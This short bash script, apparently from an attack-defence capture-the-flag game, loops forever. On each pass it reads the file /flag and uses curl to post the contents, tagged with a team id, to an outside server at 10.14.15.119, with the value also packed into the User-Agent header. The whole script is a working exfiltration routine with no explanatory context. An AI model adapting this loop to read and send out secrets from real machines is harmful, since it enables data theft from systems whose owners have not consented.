#!/bin/bash

while true
do
id=28
flag="$(cat /flag)"
curl -s 'http://10.14.15.119:8765/api/flag' -H 'Content-type: application/json' -H "User-Agent: $flag" --data '{"id": '$id', "flag": "'$flag'"}' --connect-timeout 1
sleep 1
done
